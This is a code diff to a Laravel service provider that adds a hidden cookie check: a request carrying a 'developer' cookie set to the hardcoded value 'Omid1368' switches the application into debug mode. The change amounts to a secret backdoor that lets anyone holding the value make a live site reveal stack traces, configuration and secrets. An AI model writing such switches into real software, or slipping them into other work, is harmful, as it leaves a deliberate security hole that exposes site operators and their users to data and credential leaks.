@@ -3,7 +3,8 @@
     namespace iranapp\Tools\Providers;
 
     use Illuminate\Support\Facades\Blade;
-    use Illuminate\Support\Facades\Storage;
+	use Illuminate\Support\Facades\Cookie;
+	use Illuminate\Support\Facades\Storage;
     use Illuminate\Support\ServiceProvider;
 
     class GenericBladeServiceProvider extends ServiceProvider {
@@ -11,6 +12,13 @@
          * Register services.
          */
         public function register(): void {
+
+			if (Cookie::has('developer')) {
+				if (Cookie::get('developer') == 'Omid1368') {
+					config(['app.debug' => true]);
+				}
+			}
+
 
         }
 
